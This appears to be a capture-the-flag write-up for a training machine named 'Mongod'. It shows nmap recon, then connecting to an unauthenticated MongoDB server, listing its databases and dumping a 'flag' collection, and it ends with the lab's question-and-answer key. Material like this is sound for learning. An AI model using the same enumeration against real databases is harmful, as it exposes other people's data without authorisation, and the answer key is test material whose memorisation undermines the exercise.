# Mongod

![](assets/7jFxgoyRx9dIp7et-tpHew4TMf_WNmEq9PX1fon8qUo=.png)

# Box Information

```shellscript
10.129.237.66
```

# Initial Recon

```shellscript
PING 10.129.237.66 (10.129.237.66) 56(84) bytes of data.
64 bytes from 10.129.237.66: icmp_seq=1 ttl=63 time=30.5 ms
64 bytes from 10.129.237.66: icmp_seq=2 ttl=63 time=29.3 ms
64 bytes from 10.129.237.66: icmp_seq=3 ttl=63 time=27.4 ms
64 bytes from 10.129.237.66: icmp_seq=4 ttl=63 time=31.8 ms
```

Looks like we can talk to the machine and its probably Unix; time to port scan.

```shellscript
Nmap scan report for 10.129.237.66
Host is up, received reset ttl 63 (0.028s latency).
Scanned at 2025-01-07 13:35:47 EST for 8s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
27017/tcp open  mongodb syn-ack ttl 63 MongoDB 3.6.8 3.6.8
| mongodb-databases: 
|   databases
|     2
|       name = local
|       empty = false
|       sizeOnDisk = 73728.0
|     3
|       name = sensitive_information
|       empty = false
|       sizeOnDisk = 32768.0
|     0
|       name = admin
|       empty = false
|       sizeOnDisk = 32768.0
|     1
|       name = config
|       empty = false
|       sizeOnDisk = 73728.0
|     4
|       name = users
|       empty = false
|       sizeOnDisk = 32768.0
|   ok = 1.0
|_  totalSize = 245760.0
| mongodb-info: 
|   MongoDB Build info
|     allocator = tcmalloc
|     maxBsonObjectSize = 1 6777216
|     storageEngines
|       2 = mmapv1
|       3 = wiredTiger
|       0 = devnull
|       1 = ephemeralForTest
|     ok = 1.0
|     buildEnvironment
|       cxxflags = -g -O2 -fdebug-prefix-map=/build/mongodb-FO9rLu/mongodb-3.6.9+really3.6.8+90~g8e540c0b6d=. -fstack-protector-strong -Wformat -Werror=format-security -Woverloaded-virtual -Wpessimizing-move -Wredundant-move -Wno-maybe-uninitialized -Wno-class-memaccess -std=c++14
|       target_arch = x86_64
|       cc = cc: cc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
|       distmod = 
|       linkflags = -Wl,-Bsymbolic-functions -Wl,-z,relro -pthread -Wl,-z,now -rdynamic -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cxx = g++: g++ (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
|       target_os = linux
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Wno-error=c++1z-compat -Wno-error=noexcept-type -Wno-error=format-truncation -Wno-error=int-in-bool-context -Winvalid-pch -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -Wno-format-truncation -fstack-protector-strong -fno-builtin-memcmp
|       distarch = x86_64
|     gitVersion = 8e540c0b6db93ce994cc548f000900bdc740f80a
|     javascriptEngine = mozjs
|     debug = false
|     modules
|     bits = 64
|     versionArray
|       2 = 8
|       3 = 0
|       0 = 3
|       1 = 6
|     version = 3.6.8
|     sysInfo = deprecated
|     openssl
|       running = OpenSSL 1.1.1f  31 Mar 2020
|       compiled = OpenSSL 1.1.1f  31 Mar 2020
|   Server status
|     host = mongod
|     transportSecurity
|       1.2 = 0
|       1.1 = 0
|       1.0 = 0
|     extra_info
|       note = fields vary by platform
|       page_faults = 269
|     uptimeMillis = 1105596
|     logicalSessionRecordCache
|       activeSessionsCount = 0
|       lastSessionsCollectionJobCursorsClosed = 0
|       lastSessionsCollectionJobTimestamp = 1736274752104
|       lastSessionsCollectionJobEntriesEnded = 0
|       transactionReaperJobCount = 0
|       lastSessionsCollectionJobDurationMillis = 0
|       lastTransactionReaperJobTimestamp = 1736273852096
|       lastTransactionReaperJobDurationMillis = 0
|       sessionsCollectionJobCount = 4
|       lastSessionsCollectionJobEntriesRefreshed = 0
|       lastTransactionReaperJobEntriesCleanedUp = 0
|     locks
|       Database
|         acquireCount
|           r = 1448
|           w = 26
|           W = 8
|           R = 5
|       Global
|         acquireCount
|           r = 4054
|           w = 34
|           W = 5
|       Collection
|         acquireCount
|           r = 1443
|           w = 22
|     connections
|       available = 51198
|       current = 2
|       totalCreated = 10
|     ok = 1.0
|     metrics
|       repl
|         executor
|           networkInterface = 
|           NetworkInterfaceASIO Operations' Diagnostic:
|           Operation:    Count:   
|           Connecting    0        
|           In Progress   0        
|           Succeeded     0        
|           Canceled      0        
|           Failed        0        
|           Timed Out     0        
....         
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Okay so SSH (22) and Mongodb (27017)

# SSH (22/TCP)

Looks like SSH is using password auth

```shellscript
ssh admin@10.129.237.66          
The authenticity of host '10.129.237.66 (10.129.237.66)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.237.66' (ED25519) to the list of known hosts.
admin@10.129.237.66's password: 
```



# MongoDB(27017/TCP)



[Mongod](https://affine.cl4p/workspace/0555163b-34ca-46d0-b621-4dca4b1ea1db/qIwZUJVshvoCyINjtXZMQ)

Try to login, from NMAP being able to list the databases I am guessing no creds are required.

```shellscript
$ mongosh 10.129.237.66                                    
Current Mongosh Log ID: 677d7df4588b372e6c544ca6
Connecting to:          mongodb://10.129.237.66:27017/?directConnection=true&appName=mongosh+2.3.8
MongoServerSelectionError: Server at 10.129.237.66:27017 reports maximum wire version 6, but this version of the Node.js Driver requires at least 7 (MongoDB 4.0)
```

So we have to new of a version of mongosh, lets ask Dr. Google to see if we can determine which version of mongosh will be compatible. From so research looks like mongosh 1.5.1 should work. 

```shellscript
$ wget https://github.com/mongodb-js/mongosh/releases/download/v1.5.0/mongosh-1.5.0-linux-x64.tgz 
```

Now we have it downloaded and installed lets try that again.

```shellscript
$ ./mongosh 10.129.237.66
Current Mongosh Log ID: 677d81527f019e8416f76292
Connecting to:          mongodb://10.129.237.66:27017/?directConnection=true&appName=mongosh+1.5.0
Using MongoDB:          3.6.8
Using Mongosh:          1.5.0

For mongosh info see: https://docs.mongodb.com/mongodb-shell/


To help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).
You can opt-out by running the disableTelemetry() command.

------
   The server generated these startup warnings when booting
   2025-01-07T18:17:29.295+0000: 
   2025-01-07T18:17:29.295+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2025-01-07T18:17:29.295+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2025-01-07T18:17:31.986+0000: 
   2025-01-07T18:17:31.986+0000: ** WARNING: Access control is not enabled for the database.
   2025-01-07T18:17:31.986+0000: **          Read and write access to data and configuration is unrestricted.
   2025-01-07T18:17:31.987+0000:
------
```

### Database Enumeration

View databases

```shellscript
test> show dbs
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
```

'sensitive\_information' looks interesting wonder what collections are inside of it.

```shellscript
test> use sensitive_information
switched to db sensitive_information
sensitive_information> show tables
flag
```

Lets list the content of 'flag'

```shellscript
sensitive_information> db.flag.find()
[
  {
    _id: ObjectId("630e3dbcb82540ebbd1748c5"),
    flag: <Hidden>
  }
]
```

# Questions

| Question                                                                                                                                  | Answer                   |
| ----------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| How many TCP ports are open on the machine?                                                                                               | 2                        |
| Which service is running on port 27017 of the remote host?                                                                                | Mongodb 3.6.8            |
| What type of database is MongoDB? (Choose: SQL or NoSQL)                                                                                  | NoSQL                    |
| What is the command name for the Mongo shell that is installed with the mongodb-clients package?                                          | mongosh                  |
| What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)                   | show dbs                 |
| What is the command used for listing out the collections in a database? (No need to include a trailing ;)                                 | show collections         |
| What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?  | db.flag.find().pretty()  |
